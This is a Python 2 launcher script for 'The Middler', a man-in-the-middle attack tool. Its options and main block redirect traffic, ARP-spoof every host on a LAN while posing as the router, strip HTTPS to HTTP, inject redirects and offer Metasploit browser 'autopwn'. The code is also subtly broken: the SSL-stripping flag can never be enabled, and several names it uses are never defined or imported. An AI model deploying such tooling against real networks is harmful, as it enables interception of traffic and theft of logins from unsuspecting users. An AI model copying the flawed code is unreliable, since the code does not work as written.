#!/usr/bin/env python
import middlerlib as ml
import signal
import sys,os
import threading

# Add The Middler's module namespace to the path.
sys.path.append(os.curdir + os.sep)

from jlog import *

############################################################################################################
# Parse command-line options                                                                               #
############################################################################################################

def parseCommandLineFlags():

  from optparse import OptionParser
  parser = OptionParser(usage="%prog [-i ip] [-p port] [--sslstrip]", version="%prog 1.0")
  parser.add_option("-i", "--ip", dest="ip",
                  help="listen on IP",default="0.0.0.0")
  parser.add_option("-p", "--port", dest="port",
                  help="listen on port",default="80")
  parser.add_option("-s", "--sslstrip",
                  action="store_false", dest="sslstrip", default=False,
                  help="change HTTPS links to HTTP, while sending data to the server over HTTPS")
  parser.add_option("-u", "--url", dest="url",
                  help="URL to inject", default="")
  parser.add_option("-a", "--autopwn", dest="autopwn",
                  help="auto-p0wn browsers via Metasploit")
  parser.add_option("-r", "--redirect_via_arpspoof", dest="toggle_arpspoof",
                  help="activate ARP spoofing to send out ARP replies claiming the router's IP address")
  (options,args)=parser.parse_args()

  return (options,args)


###################################
# Main non-class Code starts here.
###################################


# First, parse out command-line options

if __name__ == '__main__':


  ##############################
  # Parse command-line options #
  ##############################

  (options,args) = parseCommandLineFlags()

  ml.hostname = options.ip
  ml.port = int(options.port)

  # Will we be removing SSL from the response?
  ml.MiddlerHTTPProxy.remove_ssl_from_response = 0
  if options.sslstrip:
    ml.MiddlerHTTPProxy.remove_ssl_from_response = 1

  # Will we be injecting redirects?
  ml.IR = ml.InjectRedirect()
  # Location we'd like to inject, with 301 (permanent) or 307 (temporary)
  ml.location_to_inject = ""
  if options.url != "":
    ml.location_to_inject = options.url
    IR.set_inject_redirect(1)
    if not re.match(r"^http",ml.location_to_inject):
      print "website_to_redirect_users_to must start with http:// or https://\n"
      sys.exit(1)



  ###################
  # Signal handling #
  ###################

  # Define a signal handler so we can make sure we close the log files.
  def handle_signal_term(signum,frame):


    # Kill off any children we've left around, generally from ARP spoofing.
    for pid in ml.child_pids_to_shutdown:
      kill(pid,9)

    # TODO-High: cleanly deactivate ARP spoofing

    # Deactivate any ARP spoofing
    # deactivate_arpspoof()


    # Turn off the firewalling/routing
    ml.debug_log("Deactivating routing/firewall-based packet fu.")
    ml.Middler_Firewall.stopRedirection()

    # Close up the log files.
    ml.debug_log("Closing log files.\n")
    ml.stop_logging()
    exit(0)


  # Catch normal kill command
  signal.signal(signal.SIGTERM, handle_signal_term)
  # Catch Ctrl-C
  signal.signal(signal.SIGINT, handle_signal_term)

  # Initialize Logging - open files for writing and create thread locks.
  ml.initialize_logging()

  # Start up the firewalling and routing to  send traffic to us.
  #from ml.Middler_Firewall import startRedirection,stopRedirection
  ml.Middler_Firewall.startRedirection()

  # Activate the DNS spoofing?
  #os.spawnl(os.P_NOWAIT,r"/Users/jay/BFF_DNS.pl","")

  #
  # Activate the ARP spoofing.
  #

  #
  # The middle_the_net module contains functions to target and MitM the LAN
  #
  # First, define what interfaces we need to ARPspoof.
  #
  if ml.toggle_arpspoof:

    # Now, launch a thread/process to ARPspoof the network.
    # We wrote this as a thread, but we might write it as a process later.
    # Doing the latter requires working with shared memory and command channels.
    ml.set_up_arpspoofing(target_host="ALL",interface="defaultroute",impersonated_host="defaultrouter")

  # Start up the multi-threaded proxy
  ml.debug_log("Activating proxy\n")

  server = ml.ThreadedTCPServer((ml.hostname,ml.port), ml.MiddlerHTTPProxy)
  print("Middler Started and Proxying")
  server_thread = threading.Thread(target=server.serve_forever)
  server_thread.setDaemon(True)
  server_thread.start()
  print "Server loop running in thread:", server_thread.getName()

  while True:
    pass
  # We shouldn't ever reach this line, since the signal handler should do this.
  ml.stop_logging()
